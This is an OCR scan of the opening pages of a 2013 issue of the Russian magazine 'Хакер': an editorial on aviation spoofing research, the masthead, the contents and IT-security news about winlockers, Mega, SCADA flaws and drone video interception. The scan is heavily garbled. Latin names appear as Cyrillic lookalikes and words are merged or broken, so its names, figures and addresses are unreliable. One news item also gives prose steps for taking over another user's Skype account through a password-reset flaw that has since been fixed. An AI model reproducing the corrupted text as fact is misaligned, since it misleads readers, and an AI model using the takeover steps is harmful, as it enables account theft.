ИНТЕРВЬЮ С МАРКОМ РУССИНОВИЧЕМе 





НОВЫЙ УДАР 
П0М0Ы600В 



МАССОВЫЕ 
АТАКИ ЧЕРЕЗ 
БАННЕРНЫЕ 
СЕТИ 



КА-96016 

67.0.900 



ГРАМОТНАЯ 

ВЕРСТКА 

СВ00Т5ТРАР 



СПУФИНГ 

В ВОЗДУХЕ 



КАК НЕЗАЩИЩЕННОСТЬ НОВЫХ 
СРЕДСТВ КОММУНИКАЦИЙ В АВИАЦИИ 
МОЖЕТ ПРИВЕСТИ К КАТАСТРОФЕ 








«Сходи послушай, будешь бояться летать», — сказал мнеодин 
из организаторов ІегоМідМз, направляя на доклад Андрея 
Костина о безопасности авиационныхтехнологий. Испугаться я, 
конечно, не испугался, но еще разубедился: мы переходим в со- 
вершенно другую эпоху, когда уязвимости могут стоить человече- 
скихжизней. Спуфингна мониторавиадиспетчера, генерирующий 
фейковые сигналы от несуществующих самолетов, удаленное 
управление кардиостимуляторами, переполнение буфера 
в бортовом компьютере автомобиля, — об этом раньше фанта- 
зировали и писали в книгах (как гость нашего интервью — Марк 
Руссинович), а теперь рассказывают исследователи на различных 
конференциях. Никакихтебе страшилок и преувел ичений. Только 
факты: естьтехнология — и онауязвима. Иной скажет, что подоб- 
ные исследования опасны, но как еще привлечь к ним внимание 
изаставитьлюдей, ответственныхза разработкутакихтехноло- 
гий, исправить свои оплошности? Далеко за примером ходить не 
надо: благодаря работе Андрея Международная организация граж- 
данской авиации создала рабочую группу по кибербезопасности. 



Степан «5(ер» Ильин, 
главредХ 

ІѵѵіИег.сот/вІераб 




РЕДАКЦИЯ 

Главный редактор 
Заместитель главного редактора 
по техническим вопросам 
Шеф-редактор 
Выпускающий редактор 



Степан «5(ер» Ильин [ •■■рйгоа хокдр.ги і 



Андрей «АпгігизМоск» Матвеев I і 



Илья Курченко ІкигсГіепкоЙгеаІ.хакер.гиІ 



Редакторы рубрик 

РС20МЕииЫІТ5 

Х-МОВИЕ 

ВЗЛОМ 

ШХОЮиБѴМ/АСК 
МАЦЛ/АВЕ и КОДИНГ 

Литературный редактор 
РР-менеджер 

оѵо 

Выпускающий редактор 
ЦЫх-раздел 
Зесигііу-раздел 
Монтаж видео 



Илья И 

Андрей «АпсігивЬоск» М 
Юрий Гольцев! I 



Александр«Ог. КІоипіг» Лозовский іаіехапсіегй геаі хакер ги) 

Евгения Шарипова 

Анна Григорьева [дпд огіеѵаіЗдІс.ги І 



Андрей «АпгігизНоск» 
Дмитрий «01 ді » Еі 
Максим Трубицын 



АКТ 

Арт-директор 
Дизайнер 
Верстальщик 
Б ил ьд- редактор 
Иллюстрация на обложке 

рішиБншо 

Издатель ООО «Гейм Лэнд», IV 
Тел.: (495) 934-70-34, 



Алик Вайнер ( аіікйдк .ги) 

Егор Пономарев 
Вера Светлых 
Елена Беднова 
Алик Вайнер! у -ГЗ д! ) 

Ь, г. Москва, Фрунзенская 1 -я ул., д. 5 
;с: 1495] 545-09-06 



Главный дизайнер Энди Тернбулл 



РАЗМЕЩЕНИЕ РЕКЛАМЫ 

ООО «Рекламное агентство «Пресс-Релиз» 

Тел.: [4951 935-70-34, факс: 1495) 545-09-06 
Е-таіІ: асЗѵегШд іс.гц 



ДИСТРИБУЦИЯ 

Директор по дистрибуции 



ПОДПИСКА 

Руководитель отдела подписки 
Менеджер спецраспространения 



Претензии и дополнительная информация 

В случае возникновения вопросов по качеству печати и 0Ѵ0-дисков: нтОдІс.ги . 

Горячая линия по подписке 

Онлайн-магазин подписки: №р://5Ьср.д!с.ги 

Факс для отправки купонов и квитанций на новые подписки: (495) 545-09-06 
Телефон отдела подписки для жителей Москвы: [495) 663-82-77 
Телефон для жителей регионов и для звонков с мобильных телефонов: 8-800-200-3-999 
Для писем: 101000, Москва, Главпочтамт, а/я 652, Хакер 



Учредитель: ООО «Врублевский Медиа», 1 25367, г. Москва, Врачебный проезд, д. 10, офис 1 
Зарегистрировано в Министерстве Российской Федерации по делам печати, телерадиовещанию 
и средствам массовых коммуникаций ПИ N9 ФС77-50451 от 04 июля 2012 года. 



Отпечатано в типографии 5сапи/еЬ, Финляндия. Тираж 200 000 экземпляров. 

Мнение редакции не обязательно совпадает с мнением авторов. Все материалы в номере 
предоставляются как информация к размышлению. Лица, использующие данную информацию 
в противозаконных целях, могут быть привлечены к ответственности. Редакция не несет ответ- 
ственности за содержание рекламных объявлений в номере. За перепечатку наших материалов 
без спроса— преследуем. 



По вопросам лицензирования и получения прав на использование редакционных материалов 
журнала обращайтесь по адресу: піепійдіс.гц . 

©ООО «Гейм Лэнд», РФ, 2013 





Сопіепі 



НЕАОЕК 




Из МісгозоМушел 
Стивен Синофски, 
отвечавший 
за выпуск И/іп(1оѵѵ5 7/8 
и Місго&оНБигГасе 



004 


МЕ6АЫЕѴѴ5 


017 


Ргоо^-оі-сопсері 




Все новое за последний месяц 




Битсквоттинг: проверка эффективности 


016 


Колонка Степы Ильина 








Про гигиену работы с кодом 








Как создавался 
М05ТНАѴЕ 



Интервью с Марком 
Руссиновичем 




СПУФИНГ В ВОЗДУХЕ 

018 



Обычно, когда мы говорим о различных уязвимостях на страницах 
][, предполагается, что жертва рискует информацией, деньгами, 
доступом к сервису или машине, — словом, речь идет о значительном, 
но не смертельном уроне. В этот раз все серьезней — атаки 
на авиационные коммуникации могут привести к тысячам жертв. 






РС20ЫЕ 



КОДИНГ 



На седьмом небе 

Расширяем функциональность облачных сервисов 

Властыолпе 

Собираем средства на самые безумные идеи 

Горячая десятка подкастов 

Что посмотреть и послушать 



Х-МОВИЕ 



Большая тройка 

Наглядная история развития трех главных ОС мобильного 
рынка 

Лучшее— друг хорошего 

Общие принципы сборки Апсігоісі из исходных кодов 



ВЗЛОМ 



ЕазуНаск 

Хакерские секреты простых вещей 

Обзор эксплойтов 

Анализ свеженьких уязвимостей 

Колонка Алексея Синцова 

НеарЗргау: ЬасИоіЬесІа55Іс 

Ударпо МопдоЭВ 

Сценарии атаки на N0801 базу данных 

0тчетс2егоЫідМз 

Ерізосіе 0x02 

Предсказания сбываются 

Новые способы атак на генераторы псевдослучайных чисел 
вРНР 

Метаморфозы 

Изучаем возможности фреймворка Меіазт 

Х-Т00І5 

7утилитдля исследователей безопасности 



090 Швейцарский нож для Ш 

Знакомимся сТѵѵіиегВооІзІгар 
096 Стань робототехником! 

Управляем своим роботом с помощью 
МісгозоИ РоЬоІісзОеѵеІорегЗіисііо 
102 Наш клиент — андроид! 

Спариваем РНРи ^ѵа/АпгігоісІ в экстазе клиент-серверного 
приложения 

106 Задачи на собеседованиях 

Подборка интересных заданий, 
которые даютна собеседованиях 



ЦЫІХОШ 



108 Исполин, какихнемного 

Краткий экскурс втеорию и практику зу5ІетсІ 
112 Что нам стоитТукса встроить? 

Создание встраиваемых систем на основе фреймворка 
ОрепЕтЬесісІесі 

■■ 5УЫ/АСК 

118 Спасти матрешек 

Централизованное обеспечение безопасности 
гостевых систем 

122 Попурри 

Обзор полезных, но малоизвестных функций 
ѴѴіпсіоѵѵз Бегѵег 2012 

126 Лицом к лицу 

Выбираем решение для организации корпоративных 
видеоконференций 



РЕККІЖ 



МАІЛѴАКЕ 



Криптором поантивирусу 

Тестируем аверы на предметпротивостояния 
зашифрованному вредоносному коду 

СЗРРвмассы! 

Фреймворкдля проведения массовыхатакчерез 
баннерные сети 



132 1.аРигіаРо]а 

Тестирование топовых материнских плат на базе чипсета 
АМР990РХ 

139 А51І5 РІ.-Х51 Р/Р1-Х52Р 

Скоростная связь через розетку 

н юниты 

141 РАО 

Вопросы и ответы 
КЗ Диско 

8,5 Гб всякой всячины 
144 ѴѴѴѴѴѴ2 

Удобные ѵѵеЬ-сервисы 





МЕ0АЫЕѴѴ5 




М02ІЫ.А ПРЕКРАТИЛА РАЗРАБОТКУ 

Рігеіох 64 Ьіі для Мпс1оѵѵ5. 

64-раз рядные сборки откатят 
на 32-разрядную версию. 



ТРОЯН ПУГАЕТ 
ПОЛЬЗОВАТЕЛЕЙ 
СНИМКАМИ С ВЕБ-КАМЕР 

ПСИХОЛОГИЧЕСКИЕ ТРЮКИ НА СЛУЖБЕХАКЕРОВ 

винлокерам всех мастей публика уже успела привыкнуть. 
Очевидно, что стандартные для такого рода малвари непри- 
стойные картинки, угрозы сдать пользователя полиции и другие 
ухищрения перестали работать так хорошо, как раньше. Но вирусописа- 
тели всегда сумеют придумать что-то новенькое. 

Недавно компания Ог.ѴѴеЬ опубликовала информацию о Тп^ап. 

6ар2.1 под \Л/іпгіо\л/5 32/64 Ьіі, который отличает высокий уровень раз- 
работки, сложность и поддержка плагинов. Сам по себе вредонос весьма 
интересен, но сейчас речь не о нем, ведь один из его модулей просто 
прекрасен в своей простоте и гениальности. На первый взгляд это 
обычный винлокер, получивший имя Тго)ап.ѴѴіпІоск.7384. Он проверяет 
по ІР-адресу местонахождение компьютера жертвы, если это Западная 
Европа или Америка, блокирует систему и выводитокно стребовани- 
ем перевести определенную сумму на указанный счет. Все бы ничего, 
но вместе с этим блокировщик перехватывает изображение с подклю- 
ченной к зараженному компьютеру веб-камеры (если таковая имеется) 
и выводит «портрет» пользователя в правом верхнем углу окна. Ниже 
следует довольно стандартный текст, где пользователю грозят право- 
охранительными органами, сообщают, что он нарушил все, что мог, все 
его действия записываются, а его лицо будет использовано для передачи 
данных в полицию, если он не заплатит указанную сумму. Работает просто 
отлично— пользователи пугаются :). 



Гуманныехакеры 
требуютсо своих 
жертвЮОевроили 
ІбОдолларовСША, 
апослеперечис- 
лениясуммы даже 
всамомделеразбло- 
кируюткомпьютер. 






ѴѴІЫБ0ѴѴ5 8ТАК ПРОСТО 
НЕ ВЫТРАВИШЬ 

НАКЛЕЙКИССЕРИЙНЫМНОМЕРОМ — ПРОШЛЫЙ ВЕК 

ачались продажи устройств с предустановленной 
ѴѴіпсіоѵѵб 8, и «с полей» стали приходить сообщения о том, 
что от новой операционкитак просто не избавишься. Вла- 
дельцы ноутбуков обнаружили, что лицензионный ключ, который 
теперь прошивается прямо в ВІОБ ноутбука, может стать источ- 
ником некоторых проблем. Как всегда, придумали это решение 
для удобства пользователей. Чтобы не нужно было искать на днище 
или в аккумуляторном отсеке устройства стикер с лицензионным 
ключом, как это было раньше. Однако теперь возни кает зако- 
номерный вопрос: а что, если захочется сделатьапгрейд? Ачто, 
если, имеяустройствосбазовой версией ѴѴіпгіоѵѵз 8, пользователь 
приобрететдисксѴѴіпсіоѵѵ5 8 Рго? Ведь при установке с этого диска 
система автоматически используетлицензионный ключ, проши- 
тый в ВІОБ. В итоге будет установлена обычная версия ѴѴіпйоѵѵз 8, 
а никак не ѴѴіпсіоѵузв Рго. 

Кроме того, есть еще одна очевидная загвоздка: если пользова- 
телю нужноузнатьего лицензионный ключ, придется лезть в реестр 
или пользоваться специализированными программами вроде 
МадісаиеІІу Веап Кеу^іпсіег, которая определяется некоторыми 
антивирусами как РБѴ\/ТооІ.ѴѴіп32.Р А5.а. Обычных, непродвинутых 
юзеров жаль. 





В РОССИИ С 1 ДЕКАБРЯ 
2013 ГОДА все же появится 
возможность сохранения 
номера телефона при смене 
сотового оператора. 



ПРОДАЖИ ЖІИООЖ5 8 СТАР- 
ТОВАЛИ БОДРО— за первые 
четыре дня было реализова- 
но более четырех миллионов 
копий. У 05 XI 0.8, для срав- 
нения, за тот же период было 
три миллиона. 



5АМ51ЖС НАКОНЕЦ НАЧНЕТ 
ПРОИЗВОДСТВО ГИБКИХ 
ДИСПЛЕЕВ П.ЕХІВІЕОІ.ЕО 
в первой половине 2013 года, 
сообщаетѴ/аІІ ЗігееЫоигпаІ, 
ссылаясь на свои источники. 



ЗАКРЫТЫЙ В ИЮЛЕ 
ОЕНОИОІО НЕОЖИДАННО 
СТАЛ ПОДАВАТЬ ПРИЗНА- 
КИ ЖИЗНИ. Хотя домены 
Оетопоігі были проданы, 
а ресурс закрыт, трекер ожил 
и стабильно работает. 



ГЕНЕРАЛЬНЫЙ ДИРЕК- 
ТОРІИТЕШол Отеллини, 
возглавлявший компанию 
с 2005 года, покинул свой 
пост, а вместе с ним Іпіеі, 
проработав там почти сорок 
лет. 



004 



ХАКЕР 01 /168/2013 










МЕ6АЫЕѴѴБ 



САМЫМ ПРОДАВАЕМЫМ СМАРТФОНОМ втретьем квартале 2012года, поданным Бігаіеду Апаіуіісз, стал Батзипд Оаіаху Б III. 



КИМ ДОТКОМ НЕ СДАЕТСЯ 

БОЛЬШИЕ ПЛАНЫ ОПАЛЬНОГО СОЗДАТЕЛЯ МЕ6А0РЮА0 

□ отя меч американского правосудия по-прежнему зане- 
сен над Кимом Доткомом, это, похоже, волнует его далеко 
не в первую очередь. На всякий случай напомню, что создателя 
Медаиріоасі очень хотят видеть в Штатах, где ему инкриминируют вы- 
могательство, отмывание денег и массовые нарушения авторских прав. 
Америка до сих пор добивается его экстрадиции, но пока безрезультат- 
но— Ким гуляет на свободе и строит грандиозные планы. 

О том, что Медаиріоасі будет возрожден, Ким начал намекать прак- 
тически сразу после выхода под залог зимой прошлого года. Недавно 
стало известно, что запуск возрожденного файлообменника назначен 
на 1 9 января 2013 года, и Дотком в интервью изданию ѴѴігесі поделился 
некоторыми подробностями о проекте. Известно, что старый-новый 
файлообменник строится с учетом ошибок прошлого. Так, вся инфор- 
мация на новом Медаиріоасі (а теперь просто Меда] будет храниться в за- 
шифрованном виде. Перед закачкой на сайт все файлы будут обраба- 
тываться алгоритмом АЕ5, и пользователи получатуникальные ключи 
для их расшифровки. Как распорядиться ключом — решать самому 
юзеру, можно и опубликовать его в открытом доступе, а можно спрятать 
подальше. Таким образом, ни провайдер, ни сотрудники Меда не будут 
знать, кто и какие файлы хранит на хостинге. 

Если правообладатели сумеют найти уникальный ключ и доказать, 
что зашифрованный им файл содержит нелегальный контент, то адми- 
нистрация Меда, конечно, удалит этот файл. Однако из-за шифрования 
не будет никакой возможности уничтожить все экземпляры файла 
одним махом. Если файл загрузят сто раз, зашифровав сотней разных 
ключей, правообладателям придется разбираться с каждым отдельно. 

На случай ареста и изъятия серверов Дотком намерен заключить 
договоры с несколькими хостинг-провайдерами на разных континен- 
тах, а также планирует использовать распределенное хранение данных 
на компьютерах самих пользователей. В теории к распределенной сети 
хранения Меда сможет подключиться любой хост. Дотком поставил 
перед собой цель— создать не просто централизованный веб-сервис, 
но целую сеть из тысяч независимых узлов, каждый из которых будет 
хранить часть файлов Меда. В итоге сайт должен стать лишь фасадом 
для этой сети. Ким говорит, что его юристы отлично поработали и под- 
копаться к возродившемуся файлообменнику будет крайне трудно. 

Он даже не совсем «забыл» об интересах правообладателей, пообещав, 
что киностудии и звукозаписывающие компании смогутудалять файлы 
по упрощенной процедуре, но только если подпишут договор, гаранти- 
рующий отказ от претензий к самому сервису. 

Меда уже обзавелся адресом, правда пока непонятно, постоянный 
ли он: пледа. со.П 2 . Почему такой странный домен? Дело втом, что ис- 
ходно предполагалось запускать проект на красивом адресе те. да, 
расположенном в национальной зоне Габона. Однако власти Габона 
не пожелали иметь с Доткомом и пиратством ничего общего и от греха 
подальше отобрали домен ппе.да у владельца. Параллельно со всем 
вышеописанным Дотком объявил о возрождении еще одного амбици- 
озного проекта — магистрали Расіііс НЬге, которая должна соединить 
Новую Зеландию и США по днуТихого океана! Проект стоимостью 400 
миллионов долларов будет частично финансироваться компанией 
Меда, а частично — сторонними инвесторами. 



ДЫРАВ5КѴРЕ 



ДАВНОУГОН ЧУЖОГО АККАУНТАНЕБЫЛТАКЛЕГОК 




овольно глупая брешь обнаружилась в без- 
опасности Бкуре. Сторонники теории «с 
тех пор как МісгозоК купила Бкуре, он уже 
не торт» ликуют. Уязвимость крылась даже не в самой 
программе, подвел... сервис восстановления паролей. 
Баг был настолько банален и примитивен, что многие 
не сразу поверили в его реальность. Схема проста: ре- 
гистрируем новый аккаунт, указываем любой пароль, 
но в качестве е-таіі —адрес жертвы. 

Затем запускаем процедуру восстановления 
забытого пароля на сайте Бкуре, снова указав е-таіі 
жертвы, предварительно удалив соокіев. После 
этих манипуляций в клиент Бкуре приходит маркер 
пароля. Осталось всего лишь указать этот маркер 
на сайте Бкуре, выбрать из предложенных аккаунтов, 
привязанных к этому е-таіі, аккаунт жертвы, зайти 
в профиль и сменить пароль. Послетого как данная 
инструкция появилась на хакерских форумах, а вскоре 
новость окончательно растиражировали СМИ, взлому 
подверглись немало аккаунтов. 

Впрочем, представители Бкуре уверяют, что ока- 
зали поддержку небольшому числу пользователей, 
которые «столкнулись с неудобствами». Саму функцию 
сброса паролей сначала отключили вовсе (где-то че- 
рез сутки после распространения информации о баге), 
а потом специалисты Бкуре заявили, что обновили 
процесс сброса пароля. 

Теперь временный код опять по старинке присыла- 
ют на е-таіі. Многие задаются вопросом, а стоило ли 
вообще пытаться модернизировать сервис восста- 
новления паролей, придумывать эти самые маркеры 
и плодить сущности? 



Кстати, в скором 

будущем 

МісгозоП 

собирается 

отказаться 

отМпОоѵѵз 

иѵеМе5$епдег 

(М5Ы)ивозло- 

житьегофунк- 

циинаЗкуре. 




ДИРЕКТОР ПО ИССЛЕДОВАНИЯМ И РАЗВИТИЮ МІСК050РТЗАЯВИЛ: 



ВО ВСЕХ БЕДАХ МІСЯ050РТ ЗА ПОСЛЕДНИЕ ДЕСЯТЬ 
ЛЕТ ВИНОВАТА КИБЕРПРЕСТУПНОСТЬ, КОТОРАЯ 
ВЫБРАЛА М5 СВОЕЙ ГЛАВНОЙ МИШЕНЬЮ 



006 



ХАКЕР 01 /168/2013 





МЕ6АЫЕѴѴ5 



НА 40% ВЫРОС ВІТТОЯЯЕМТТРАФИКза последние пол года, но доля Р2Р-трафика в общем объеме, напротив, снижается, сообщает Бапсіѵіпе. 



ПАТРИОТИЧНЫЕХАКЕРЫ 
ПРОТИВ РОССИИ 



НЕТ ИНТЕРНЕТА, 
НЕТ И МЫШКИ 



ХАКЕРЫ-ПАТРИОТЫ ЗАЧЕМ-ТО АТАКОВАЛ И АВТОСЕРВИС И АПТЕКУ 




середине месяца наша и зарубежная пресса с па- 
фосом сообщили, что американские хакеры-па- 
триоты из группы БЬозіБЬеІІ намерены развязать 
кибервойну против России, а точнее, против ее правитель- 
ства. Любому понимающему человеку должно было стать 
смешно уже на этом этапе, однако не все хорошо представ- 
ляют себе мировую хак-сцену и что в ее рамках нормально, 
а что не очень. 

Нет, хак-тима ѲЬозіБЬеІІ правда существует и правда 
бросила вызов властям РФ через РазІеЬіп ( разІеЬіп.сот/ 
уХЫ7ис6г 1. объявив о старте операции РгоіесіВІаскБіаг. 

В заявлении хакеры изобличают российское правитель- 
ство, из-за которого население страны вынуждено жить 
изолированно от остального мира, ощущая коммунисти- 
ческий дух, смешанный с капитализмом, а само прави- 
тельство погрязло в коррупции, но при этом тратит деньги 
на шпионаж в западных странах. В доказательство хакеры 
даже совершили ряд взломов, но почему-то пострадало 
от них совсем не правительство, а малый и средний бизнес. 
Жертвами стали автосервис, аптека, сайт «Вакансии и ре- 
зюме Ижевска», а также десятки других образовательных, 
финансовых, транспортных и прочих организаций. И еще 
полиция. Якобы. Скорее всего какие-то школьники нашли 
сайты с дырявой СМБ и оторвались по полной. 




и 

Два с половиной 
миллионазаписей 
похитили хакеры 
вобщейсложности. 
В основном это куча 
е-таіі-адресов. 
Больше всего 
досталосьсайтам 
согр-доѵ.ги (64885 
е-тзіі] и гаЬоІа- 
ігЬеѵ$к.іп!о(66520 
е-таіі). Среди по- 
хищенныхданных 
также встречаются 
парыіодіп-раввѵѵогс] 
для некоторых 
сайтов, ноихкрайне 
мало. 




ЕСЛИ ГАДЖЕТЫ БУДУТ РАБОТАТЬ ТОЛЬКО 
ПРИ ПОДКЛЮЧЕНИИ К СЕТИ 

ожалуй, только ленивый еще не бросил камень 
в огород различных йРМ-систем защиты контен- 
та. Неприятно, когда из-за проблем у провайдера 
или плохого качества связи нельзя, к примеру, поиграть 
в честно купленную игру. Кто бы мог подумать, что подобные 
проблемы начнут возникать с железом... История одного юзе- 
ра с Оѵегсіоск.пеі неплохо смотрелась бы в комедии абсурда. 
Расстроенный парень поведал о том, что недавно приобрел 
недешевую (80 долларов) мышку Рагег №да 2012, которую 
не сумел активировать. 

Оказалось, что ПО Раіег Бупарзе 2.0 требует подключения 
к серверу активации, а если тот не работает или у пользователя 
нет подключения к Сети, то ПО установить не получится. Стоит 
пояснить, что без данного ПО девайс фактически теряет свою 
привлекательность, превращаясь в обычную ріид-апгі-ріау 
мышь. Активировать мышь бедолага не смог, так как сервер 
активации Рагегушел в офлайн из-за технических проблем. 
Саппорттоже не смог помочь, сообщив, что альтернативного 
способа активации нет. 

Вскоре последовал официальный комментарий от одного 
из разработчиков Рагег, где сообщалось, что Бупарзе дей- 
ствительно хранит настройки на сервере, но исключительно 
во благо — в целях экономии памяти внутри мыши и сниже- 
ния цен на устройства. Также подчеркивалось, что Бупарэе 
2.0 — это совсем не йРМ. Впрочем, разработчик подтвердил, 
что Бупарзе может работать в офлайне только после прохожде- 
ния онлайновой регистрации. 






НАРЫНКЕ ПОЯВИЛСЯ ЕЩЕ 
ОДИНЗО-ПРИНТЕР«ДЛЯ 
ДОМА» .каковых в продаже 
пока немного. Новинку вы- 
пустила компания БоІісіоосІІе, 
девайс получил название 
БоІісіоосІІе 3. Устройство пред- 
ставляет собой куб со стороной 
20,3 см (можно создавать объ- 
екты размерами до 20 * 20 к 
20 см). В качестве расходного 
материала для «печати» ис- 
пользуется пластиковая нить 
1,75 мм. Цена новинки— 799 
долларов. 




ЭКС-ГЛАВА ПАТЕНТНОГО ПОД- 
РАЗДЕЛЕНИЯ 0006І.Е Мишель 
Ли возглавит филиал патент- 
ного бюро США в Кремниевой 
долине. 




ДВА ИЛИ ЧЕТЫРЕ ЯДРА 
В СМАРТФОНЕ? Скоро и этого 
будет мало. По данным ЕЕ Тітез, 
Батзипд готовит к производству 
восьмиядерную однокристаль- 
ную систему! 



008 



ХАКЕР 01 /168/2013 






МЕ6АЫЕѴѴ5 



РЕКОРД ПРОДАЖ УСТАНОВЛЕН НАТАОВАО.СОМ — 3,06 миллиарда долларов за один день! Куда там Западу с «черной пятницей». 



СТИВЕН СИНОФСКИ 
ПОКИНУЛ МІСП050ЕТ 

КОМПАНИЮ ОСТАВИЛ ОДИН ИЗ ВЕТЕРАНОВ 

П ромкой отставкой ознаменовался 

конец 201 2 года: компанию МісгозоК 
после двадцати трех лет работы 
покинул один из ветеранов — Стивен Синоф- 
ски. На протяжении последних летСинофски 
отвечал за разработку и маркетингѴѴіпсіоѵѵз, 
ѴѴіпсІоѵѵз І_іѵе и Іпіегпеі Ехріогег. Именно ему 
мы обязаны стабильной ѴѴіпсІоѵѵз 7, именно под 
его шефством проходила разработка ѴѴіпсІоѵѵз 8 
и планшета Бигіасе. Тем удивительнее выгляде- 
лоувольнение Синофски, случившееся совсем 
скоро после выхода ѴѴіпсІоѵѵз 8, дела у которой 
пошли далеко не так плохо, как предрекали 
многие злопыхатели. 

Непосредственно перед уходом Стивен Си- 
нофски написал письмо, обращенное к сотрудни- 
кам МісгозоК, однако там ничего не говорилось 
опричинах его увольнения. Тем временем многие 
источники утверждали, что причиной послужил 
конфликт бывшего руководителя подразделе- 
ния ѴѴіпсІоѵѵз лично с главой компании Стивом 
Баллмером и многими другими членами совета 
директоров. Якобы Синофски отличался исклю- 
чительной конфликтностью и несговорчивостью, 
в результате чего так и не сумел стать частью 
команды. Практически «ответное» официальное 
письмо написал и сам Стив Баллмер, разумеется 
опровергнув эти слухи и заявив, что «расстава- 
ние прошло на дружеской ноте». Поверить в это 
безоговорочно сложно: в том же письме Баллмер 
непрозрачно намекает, что теперь подразделе- 
ние ѴѴіпсІоѵѵз возглавит Джули Ларсон-Грин (ко- 
торая занималась разработкой ЮЕ для ѴізиаІ С++, 
в 1 997 году возглавила команду РгопіРаде), и уж 
она-то обладает замечательными способностями 
к командной игре. Почему-то так и хочется до- 
бавить «в отличие от...». Кстати, глав у подразде- 
ления теперь будет два, финансовым директором 
назначили еще одну женщину— Тами Реллер. 

Разумеется, мы никогда не узнаем всей 
правды об этом громком увольнении, но не- 
которая пища для размышлений здесь все же 
есть. Пока одни утверждают, что Синофски хотел 
получить больше власти над определенными 
подразделениями МісгозоК и практически по- 
ставил ультиматум начальству, другие говорят, 
что он, напротив, «воевал» со всеми, кто не от- 




Биг^асе 




Стивен Синофски 
считался одним 
из наиболее вероят- 
ных претендентов 
на кресло нынешнего 
СЕОкорпорацииСти- 
ва Баллмера, однако 
всевышлоиначе. 



носился к подразделению ѴѴіпсІоѵѵз, и буквально 
саботировал взаимодействие между разными 
подразделениями. Эти теории Синофски уже по- 
спешил опровергнуть лично, но все еще остается 
один небольшой нюанс. Согласно множеству 
инсайдерских источников, Синофски дей- 
ствительно недолюбливал некоторые проекты 
МісгозоК и даже противодействовал им, если 
видел в них угрозу для ѴѴіпсІоѵѵз. В частности, 
именно он до последнего старался помешать 
компании наклепать тысячи отвратительных 
планшетов на ѴѴіпсІоѵѵз 7. Да, уже тогда было 



ясно, что без планшетов на рынке делать нечего, 
и в ѴѴіпсІоѵѵз 8 появилась поддержка сенсорных 
экранов и многие другие функции, необходи- 
мые для мобильных устройств. Однако и тогда 
Синофски, к примеру, очень критиковал и осуж- 
дал решение убрать «Пуск» с рабочего стола, 
которое ругают сейчас практически все. Словом, 
похоже, что «конфликтность» бывшего главы 
подразделения ѴѴіпсІоѵѵз зачастую была не чем 
иным, как голосом разума, который, увы, сильно 
диссонировал с выбранным компанией вектором 
и мнением совета директоров. 



ПОЧЕМУ ТНІЖОЕВВОІ_Т«НЕ ВЗЛЕТАЕТ», ПОДСЧИТАЛ 0І6ІТІМЕ5 





сейчас контроллер тнішоеквоіт стоит 

ПРИМЕРНО 20 ДОЛЛАРОВ, В ТО ВРЕМЯ 
КАК Ы5В 3.0 — 0, 5-0,8 ДОЛЛАРА. 
НЕУДИВИТЕЛЬНО, ЧТО СПРОСА НЕТ 



010 



ХАКЕР 01/168/2013 




МЕОАМЕѴѴБ 



ХАКЕРУ АН АВСНА05 (одному из арестованных членов І_иІг5ес) грозит от тридцати лет до пожизненного заключения. 



САМЫЕ УЯЗВИМЫЕ 
И ПОПУЛЯРНЫЕ 5САОА-СИСТЕМЫ 

АНАЛИТИКАЗА ПЕРИОД 2005-2012 ГОДОВ 

омпания РозіІіѵеТесЬпоІодіез опубликовала любопытный отчет. 
Специалисты компании проанализировалиуязвимости, обнаружен- 
ные в промышленных БСАйА-системах, однако в отчет вошли данные 
не за последний год, но за период с 2005 года до осени 2012 года. Чтобы оценить 
популярностьсамой АСУТП, аналитики Розіііѵе ТесЬпоІодіез использовали 
статистику вакансий на сайте НЬ.ги. В свою очередь, подсчитатьуязвимости 
в системах помогли базы уязвимостей (ІС5-СЕРТ, КІѴО, Вид(гар), уведомле- 
ния разработчиков, сборники эксплойтов (БАІМТехрІоіІ, Меіазріоіі, Іттипііу 
Сапѵазіитакдалее. 

Наиболее популярной оказалась компания Біетепз с решениями Біер 7 
(более 22%), ІА/іпСС (свыше 18%) и РС57(почти 8%). Следом идутМопгіегѵѵаге 
(ІпТоисЬ НМІ, более 12%) и Ісопісз (бепевіз, свыше 5%). Здесь аналитики Розіііѵе 
ТесЬпоІодіез отмечают, что в список не попали некоторые популярные отече- 
ственные продукты, обуязвимостях в которых ничего не известно, так как они 
редко выводятся во внешние сети. В целом период 2005-2010 годов был тихим 
и насчитывал л ишь девять уязвимостей. Дальше интерес ктеме подстегнул 
БіихпеС и в 2011 году этот показатель вырос до 64, а за первыетри квартала 2012 
года обнаружено 98 новых дыр — больше, чем за все остальное время исследо- 
вания. За весь рассматриваемый период наибольшее число уязвимостей было 
найдено в разработкахБіетепз. 




□ 

Также Розіііѵе 
ТесЬпоІодіебиз- 
училиуязвимости 
АСУТП, открытых 
в общую сеть. 
Оказалось, что почти 
третьотобщего 
числатакихЗСАОА- 
систем находится 
в США (31,3%). Второе 
итретье места 
с большим отрывом 
досталисьИталии 
(6,8%) и Южной Корее 
( 6 , 2 %). 



БЕСПИЛОТНИКИ 
В ОПАСНОСТИ! 

ПЕРЕХВАТ КАРТИНКИ С ВОЕННЫХ ДРОНОВ 

еспилотные летательные аппараты — этонетолько 
прикольные гаджеты вроде Аг.Огопе, но и серьез- 
ная боеваятехника, которую широко используют 
военные многих стран мира. В частности, армия СШАуже 
много лет применяет для своих операций беспилотники 
РгегіаІогиВеарег, оснащенные видеокамерами. Интересно, 
что при этом дроны неукомплектованы хоть каким-то обору- 
дованием для шифрования видеопотока и спокойно вещают 
«вовне» по протоколу Соттоп Оаіа І_іпк. О данной проблеме 
известно давно, и еще в далеком 2008 (!) году она перестала 
бытьтеоретической. 

Тогда иракские ополченцы научились перехватывать ви- 
деопотоксамериканскихдронов, используя примитивный 
софтстоимостью26долларов. Пентагонтогда клятвенно 
заверил общественность, чтодырузакроют, беспилот- 
ники переведут на другой протокол и, конечноже, начнут 
шифровать видео. Как выяснили в издании Оапдег Воот, 
возинынетам. 

Прошло четыре года, и оказалось, что только 30-50% 
дронов на данный моментоснастили шифровальными пе- 
редатчиками, другие по-прежнему«транслируют» видео 
в открытом виде. Оапдег Воот сообщают, что оснастить 
весьфлотшифрованием, похоже, получится не раньше 
2014 года. 







ѴМ^АКЕ СООБЩИЛА, 
что утечка исходников 
гипервизора ЕБХоказалась 
серьезнее, чем предполага- 
лось. Может ли это навредить 
клиентам ѴМѵѵаге, неиз- 
вестно. 



НАЧАЛИСЬ ПРОДАЖИ 
КАБРВЕЯЯѴ РІ МОДЕЛИ «А». 
Всегоза25долларовтыполу- 
чишьпроцАВМ 11 счастотой 
700МГцсграфическим 
процессором с поддержкой 
Орепбі. Е5 2.0 и 256 Мб ОЗУ. 



